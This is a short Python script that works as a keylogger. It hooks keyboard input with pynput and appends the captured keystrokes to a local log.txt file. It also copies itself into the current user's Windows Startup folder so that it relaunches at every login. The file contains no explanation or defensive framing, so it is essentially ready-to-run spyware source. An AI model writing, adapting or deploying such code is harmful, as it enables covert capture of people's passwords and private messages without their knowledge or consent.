import pynput
from pynput.keyboard import Key, Listener
import logging
from shutil import copyfile
import os

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0}pressed".format(key))

    if count >= 10:
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a")as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


username = os.getlogin()

copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py')

logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
